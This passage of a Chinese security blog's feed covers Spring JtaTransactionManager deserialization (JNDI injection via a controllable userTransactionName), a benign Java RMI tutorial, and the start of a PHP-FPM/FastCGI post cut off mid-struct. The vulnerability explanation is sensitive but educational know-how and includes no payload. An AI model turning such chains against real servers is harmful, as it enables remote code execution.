null"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> located;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就清晰了，这个lookup()函数符合JNDI注入的特征，且参数是JtaTransactionManager类的userTransactionName属性值，而该属性值我们是可以通过调用setUserTransactionName()的方式来设置的。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这个漏洞的产生根源是：org.springframework.transaction.jta.JtaTransactionManager类重写了readObject()方法，其中调用了JNDI注入相关的lookup()函数，而lookup()函数的参数userTransactionName为JtaTransactionManager类的属性、是可以通过调用setUserTransactionName()来设置的，从而导致lookup()函数的参数外部可控，当目标服务端进行反序列化操作时就会触发JNDI注入漏洞从而导致任意代码执行。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://zerothoughts.tumblr.com/post/137831000514/spring-framework-deserialization-rce" target="_blank" rel="noopener">Spring framework deserialization RCE</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="Spring" scheme="https://www.mi1k7ea.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI原理与使用</title>
    <link href="https://www.mi1k7ea.com/2019/09/01/Java-RMI%E5%8E%9F%E7%90%86%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.mi1k7ea.com/2019/09/01/Java-RMI原理与使用/</id>
    <published>2019-09-01T11:05:16.000Z</published>
    <updated>2019-09-02T12:45:07.405Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-何为RMI"><a href="#0x01-何为RMI" class="headerlink" title="0x01 何为RMI"></a>0x01 何为RMI</h2><p>RMI（Remote Method Invocation）即远程方法调用，是分布式编程中的一个基本思想。实现远程方法调用的技术有很多，比如CORBA、WebService，这两种都是独立于各个编程语言的。</p><p>而Java RMI是专为Java环境设计的远程方法调用机制，是一种用于实现远程调用（RPC，Remote Procedure Call）的Java API，能直接传输序列化后的Java对象和分布式垃圾收集。它的实现依赖于JVM，因此它支持从一个JVM到另一个JVM的调用。</p><p>在Java RMI中，远程服务器实现具体的Java方法并提供接口，客户端本地仅需根据接口类的定义，提供相应的参数即可调用远程方法，其中对象是通过序列化方式进行编码传输的。所以平时说的反序列化漏洞的利用经常是涉及到RMI，就是这个意思。</p><p>RMI依赖的通信协议为JRMP（Java Remote Message Protocol，Java远程消息交换协议），该协议是为Java定制的，要求服务端与客户端都必须是Java编写的。</p><h2 id="0x02-RMI的模式与交互过程"><a href="#0x02-RMI的模式与交互过程" class="headerlink" title="0x02 RMI的模式与交互过程"></a>0x02 RMI的模式与交互过程</h2><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><p>RMI的设计模式中，主要包括以下三个部分的角色：</p><ul><li>Registry：提供服务注册与服务获取。即Server端向Registry注册服务，比如地址、端口等一些信息，Client端从Registry获取远程对象的一些信息，如地址、端口等，然后进行远程调用。</li><li>Server：远程方法的提供者，并向Registry注册自身提供的服务</li><li>Client：远程方法的消费者，从Registry获取远程方法的相关信息并且调用</li></ul><h3 id="交互过程"><a href="#交互过程" class="headerlink" title="交互过程"></a>交互过程</h3><p>RMI交互过程如图所示：</p><p><img src="/2019/09/01/Java-RMI原理与使用/1.png" alt=""></p><p>在设计模式中，3个角色是的交互过程可简单概述为：</p><ol><li>首先，启动RMI Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）；</li><li>其次，Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的Naming/Context/Registry等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称；</li><li>最后，Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称），使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Service那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了；</li></ol><p>此外，我们可以看到，从逻辑上来看数据是在Client和Server之间横向流动的，但是实际上是从Client到Stub，然后从Skeleton到Server这样纵向流动的。</p><p>下面详细说下其中几个重要的概念。</p><h4 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h4><p>在RMI中的核心就是远程对象，一切都是围绕这个东西来进行的。</p><p>顾名思义，远程对象是存在于服务端以供客户端调用的对象。任何可以被远程调用的对象都必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法。这个远程对象中可能有很多个函数，但是只有在远程接口中声明的函数才能被远程调用，其他的公共函数只能在本地的JVM中使用。</p><p>使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。 </p><h4 id="RMI注册表"><a href="#RMI注册表" class="headerlink" title="RMI注册表"></a>RMI注册表</h4><blockquote><p>Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个RMI注册表（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在传说中的1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。 </p></blockquote><h4 id="Stub和Skeleton"><a href="#Stub和Skeleton" class="headerlink" title="Stub和Skeleton"></a>Stub和Skeleton</h4><p>RMI采用代理来负责客户与远程对象之间通过Socket进行通信的细节，主要是为远程对象分别生成了客户端代理和服务端代理，其中位于客户端的代理类称为Stub即存根，位于服务端的代理类称为Skeleton即骨干网。</p><p>Stub和Skeleton的具体通信过程如图：</p><p><img src="/2019/09/01/Java-RMI原理与使用/2.png" alt=""></p><p>方法调用从客户端对象经存根（Stub）、远程引用层（Remote Reference Layer）和传输层（Transport Layer）向下，传递给主机，然后再次经传输层，向上穿过远程调用层和骨干网（Skeleton），最终到达服务器对象。</p><p>Stub存根：扮演着远程服务器对象的代理的角色，使该对象可被客户激活。</p><p>远程引用层：处理语义、管理单一或多重对象的通信，决定调用是应发往一个服务器还是多个。</p><p>传输层：管理实际的连接，并且追踪可以接受方法调用的远程对象。</p><p>Skeleton骨干网：完成对服务器对象实际的方法调用，并获取返回值。</p><p>返回值向下经远程引用层、服务器端的传输层传递回客户端，再向上经传输层和远程调用层返回。最后，存根获得返回值。</p><h3 id="工厂模式和代理模式"><a href="#工厂模式和代理模式" class="headerlink" title="工厂模式和代理模式"></a>工厂模式和代理模式</h3><p>代理模式前面已经说了，这里主要是工厂模式。</p><p><img src="/2019/09/01/Java-RMI原理与使用/3.png" alt=""></p><p>如图，先假设：</p><ul><li>有两个远程服务接口可供Client调用，Factory和Product接口</li><li>FactoryImpl类实现了Factory接口，ProductImpl类实现了Product接口</li></ul><p>工厂模式的处理流程为：</p><ol><li>FactoryImpl被注册到了RMI Registry中；</li><li>Client端请求一个Factory的引用；</li><li>RMI Registry返回Client端一个FactoryImpl的引用；</li><li>Client端调用FactoryImpl的远程方法请求一个ProductImpl的远程引用；</li><li>FactoryImpl返回给Client端一个ProductImpl引用；</li><li>Client通过ProductImpl引用调用远程方法；</li></ol><p>可以看到，客户端向注册表请求获取到指定的FactoryImpl的引用后，再通过调用FactoryImpl的远程方法请求一个ProductImpl的远程引用，从而调用到ProductImpl引用指向的远程方法。</p><p>这种RMI+Reference的技术在JNDI注入中是单独作为一种利用方式。</p><h2 id="0x03-java-rmi包简介"><a href="#0x03-java-rmi包简介" class="headerlink" title="0x03 java.rmi包简介"></a>0x03 java.rmi包简介</h2><h3 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h3><p>一个interface，这个interface中没有声明任何方法。只有定义在“remote interface”，即继承了Remote的接口中的方法，才可以被远程调用。</p><h3 id="RemoteException"><a href="#RemoteException" class="headerlink" title="RemoteException"></a>RemoteException</h3><p>RemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常。</p><h3 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h3><p>提供向注册中心保存远程对象引用或者从注册中心获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如://host:port/name。</p><h3 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h3><p>一个interface, 其功能和Naming类似，每个方法都有一个String类型的name参数，但是这个name不是URL格式，是远程对象的一个命名。Registry的实例可以通过方法LocateRegistry.getRegistry()获得。</p><h3 id="LocateRegistry"><a href="#LocateRegistry" class="headerlink" title="LocateRegistry"></a>LocateRegistry</h3><p>用于获取到注册中心的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。</p><h3 id="RemoteObject"><a href="#RemoteObject" class="headerlink" title="RemoteObject"></a>RemoteObject</h3><p>重新覆写了Object对象中的equals,hashCode,toString方法，从而可以用于远程调用。</p><h3 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h3><p>用于RMI Server中导出一个远程对象并获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。</p><h3 id="Unreferenced"><a href="#Unreferenced" class="headerlink" title="Unreferenced"></a>Unreferenced</h3><p>一个interface, 声明了方法：void unreferenced()如果一个远程队形实现了此接口，则这个远程对象在没有任何客户端引用的时候，这个方法会被调用。</p><h2 id="0x04-动态类加载"><a href="#0x04-动态类加载" class="headerlink" title="0x04 动态类加载"></a>0x04 动态类加载</h2><blockquote><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 </p></blockquote><p>在JNDI注入和反序列化漏洞的利用中，正是涉及到了动态类加载。</p><h2 id="0x05-编写RMI的步骤"><a href="#0x05-编写RMI的步骤" class="headerlink" title="0x05 编写RMI的步骤"></a>0x05 编写RMI的步骤</h2><p>RMI程序的编写主要分为以下几个步骤。</p><h3 id="定义服务端供远程调用的类"><a href="#定义服务端供远程调用的类" class="headerlink" title="定义服务端供远程调用的类"></a>定义服务端供远程调用的类</h3><p>在此之前先定义一个可序列化的Model层的用户类，其实例可放置于服务端进行远程调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonEntity</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="定义一个远程接口"><a href="#定义一个远程接口" class="headerlink" title="定义一个远程接口"></a>定义一个远程接口</h3><p>远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;PersonEntity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="开发接口的实现类"><a href="#开发接口的实现类" class="headerlink" title="开发接口的实现类"></a>开发接口的实现类</h3><p>建立PersonServiceImpl实现远程接口，注意此为远程对象实现类，需要继承UnicastRemoteObject（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PersonServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;PersonEntity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        System.out.println(<span class="string">"Get Person Start!"</span>);</span><br><span class="line">        List&lt;PersonEntity&gt; personList = <span class="keyword">new</span> LinkedList&lt;PersonEntity&gt;();</span><br><span class="line"></span><br><span class="line">        PersonEntity person1 = <span class="keyword">new</span> PersonEntity();</span><br><span class="line">        person1.setAge(<span class="number">3</span>);</span><br><span class="line">        person1.setId(<span class="number">0</span>);</span><br><span class="line">        person1.setName(<span class="string">"mi1k7ea"</span>);</span><br><span class="line">        personList.add(person1);</span><br><span class="line"></span><br><span class="line">        PersonEntity person2 = <span class="keyword">new</span> PersonEntity();</span><br><span class="line">        person2.setAge(<span class="number">18</span>);</span><br><span class="line">        person2.setId(<span class="number">1</span>);</span><br><span class="line">        person2.setName(<span class="string">"Alan"</span>);</span><br><span class="line">        personList.add(person2);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> personList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建Server和Registry"><a href="#创建Server和Registry" class="headerlink" title="创建Server和Registry"></a>创建Server和Registry</h3><p>其实Server和Registry可以单独运行创建，其中Registry可通过代码启动也可通过rmiregistry命令启动，这里只进行简单的演示，将Server和Registry的创建、对象绑定注册表等都写到一块，且Registry直接代码启动：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Program</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">            <span class="comment">//注册通讯端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">6600</span>);</span><br><span class="line">            <span class="comment">//注册通讯路径</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>, personService);</span><br><span class="line">            System.out.println(<span class="string">"Service Start!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建客户端并查找调用远程方法"><a href="#创建客户端并查找调用远程方法" class="headerlink" title="创建客户端并查找调用远程方法"></a>创建客户端并查找调用远程方法</h3><p>这里我们通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//调用远程对象，注意RMI路径与接口必须与服务器配置一致</span></span><br><span class="line">            PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:6600/PersonService"</span>);</span><br><span class="line">            List&lt;PersonEntity&gt; personList=personService.GetList();</span><br><span class="line">            <span class="keyword">for</span>(PersonEntity person:personList)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ID:"</span>+person.getId()+<span class="string">" Age:"</span>+person.getAge()+<span class="string">" Name:"</span>+person.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，我们看下模拟运行的场景。</p><p>先启动Server和Register，开启成功后显示“Server Start!”，然后运行我们的Client程序，可以看到客户端成功获取到了在Register注册的Server中的远程对象的内容：</p><p><img src="/2019/09/01/Java-RMI原理与使用/4.png" alt=""></p><p>当然，写法有很多，还可以参考这个不一样写法的Demo：<a href="https://blog.csdn.net/qq_28081453/article/details/83279066" target="_blank" rel="noopener">https://blog.csdn.net/qq_28081453/article/details/83279066</a></p><h3 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h3><p>这里小结下几个函数：</p><ul><li>bind(String name, Object obj)：注册对象，把对象和一个名字name绑定，这里的name其实就是URL格式。如果改名字已经与其他对象绑定，则抛出NameAlreadyBoundException错误；</li><li>rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象；</li><li>lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象；</li><li>unbind(String name)：注销对象，取消对象与名字的绑定；</li></ul><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://segmentfault.com/a/1190000016598069" target="_blank" rel="noopener">java rmi 使用教程及原理</a></p><p><a href="https://blog.csdn.net/suifeng3051/article/details/48469523" target="_blank" rel="noopener">Java RMI原理与使用</a></p><p><a href="https://blog.csdn.net/qq_28081453/article/details/83279066" target="_blank" rel="noopener">JAVA RMI 原理和使用浅析</a></p><p><a href="https://www.cnblogs.com/leslies2/archive/2011/05/20/2051844.html" target="_blank" rel="noopener">学习笔记：JAVA RMI远程方法调用简单实例</a></p><p><a href="https://security.tencent.com/index.php/blog/msg/131" target="_blank" rel="noopener">深入理解JNDI注入与Java反序列化漏洞利用</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅谈PHP-FPM安全</title>
    <link href="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/"/>
    <id>https://www.mi1k7ea.com/2019/08/25/浅谈PHP-FPM安全/</id>
    <published>2019-08-25T10:58:52.000Z</published>
    <updated>2019-09-01T10:37:03.543Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-PHP连接模式"><a href="#0x01-PHP连接模式" class="headerlink" title="0x01 PHP连接模式"></a>0x01 PHP连接模式</h2><p>PHP中连接模式主要有以下三种。</p><h3 id="apache2-module模式"><a href="#apache2-module模式" class="headerlink" title="apache2-module模式"></a>apache2-module模式</h3><p>这种模式下，是将PHP当做Apache的一个模块，此时PHP就是Apache中的一个DLL文件或SO文件。</p><p>在phpStudy中，非nts的模式就是默认以apache2-module为连接模式。</p><h3 id="CGI模式"><a href="#CGI模式" class="headerlink" title="CGI模式"></a>CGI模式</h3><p>CGI连接模式下，PHP是作为一个独立的进程，如单独运行一个php-cgi.exe的进程，而此时Web服务器也是独立的一个进程如运行apache.exe。</p><p>当Web服务器收到HTTP请求时，就会去调用php-cgi进程，通过CGI协议，服务器把请求内容转换成php-cgi能读懂的协议数据传递给CGI进程，CGI进程拿到内容就会去解析对应PHP文件，得到的返回结果再返回给Web服务器，最后再由Web服务器返回到客户端。</p><p>但由于CGI模式下，每次客户端发起请求都需要建立和销毁进程，从而导致很大的资源消耗。因为HTTP要生成一个动态页面，系统就必须启动一个新的进程以运行CGI程序，不断地fork是一项很消耗时间和资源的工作。因此，也就诞生了FastCGI模式。</p><h3 id="FastCGI模式"><a href="#FastCGI模式" class="headerlink" title="FastCGI模式"></a>FastCGI模式</h3><p>FastCGI模式是CGI模式的优化升级版，主要解决了CGI模式性能不佳的问题。</p><p>FastCGI其实是一个协议，是在CGI协议上进行了一些优化。众所周知，CGI进程的反复加载是CGI性能低下的主要原因，如果CGI解释器能够保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over特性等等，而这些改进正是FastCGI所提供的。 </p><p>简而言之，CGI模式是Apache2接收到请求去调用CGI程序，而FastCGI模式是FastCGI进程自己管理自己的CGI进程，而不再是Apache去主动调用CGI进程，而FastCGI进程又提供了很多辅助功能比如内存管理、垃圾处理、保障了CGI的高效性，并且此时CGI是常驻在内存中、不会每次请求重新启动，从而使得性能得到质的提高。</p><h3 id="如何识别"><a href="#如何识别" class="headerlink" title="如何识别"></a>如何识别</h3><p>那么对于一个PHP Web服务，我们如何去识别它的PHP连接模式是哪个呢？</p><p>在接触不到服务器文件的情况下，最简单的办法就是查看phpinfo：</p><p>apache2-module模式：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/2.png" alt=""></p><p>CGI模式：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/3.png" alt=""></p><p>FastCGI模式：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/4.png" alt=""></p><h2 id="0x02-FastCGI"><a href="#0x02-FastCGI" class="headerlink" title="0x02 FastCGI"></a>0x02 FastCGI</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>前面说了，FastCGI其实是一个协议，和HTTP协议一样，都是用于数据交互的一个通道。</p><blockquote><p>HTTP协议是浏览器和服务器中间件进行数据交换的协议，浏览器将HTTP头和HTTP体用某个规则组装成数据包，以TCP的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以HTTP协议的规则打包返回给服务器。</p><p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p></blockquote><h3 id="协议分析"><a href="#协议分析" class="headerlink" title="协议分析"></a>协议分析</h3><p>具体的参考P牛的博客：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p><strong>record</strong></p><p>下面我们看下FastCGI协议的record结构是怎样的，这里的直接引用自P牛博客的内容：</p><blockquote><p>和HTTP头不同，record的头固定8个字节，body是由头中的contentLength指定，其结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; typedef struct &#123;</span><br><span class="line">&gt;   /* Header */</span><br><span class="line">&gt;   unsigned char version; // 版本</span><br><span class="line">&gt;   unsigned char type; // 本次record的类型</span><br><span class="line">&gt;   unsigned char requestIdB1; // 本次record对应的请求id</span><br><span class="line">&gt;   unsigned char requestIdB0;</span><br><span class="line">&gt;   unsigned char contentLengthB1; // body体的大小</span><br><span class="line">&gt;   unsigned char contentLengthB0;</span><br><span class="line">&gt;   unsigned char paddingLength; // 额外块大小</span><br><span class="line">&gt;   unsigned char reserved; </span><br><span class="line">&gt; </span><br><span class="line">&gt;   /* Body */</span><br><span class="line">&gt;   unsigned char contentData[contentLength];</span><br><span class="line">&gt;   unsigned char paddingData[paddingLength];</span><br><span class="line">&gt; &#125; 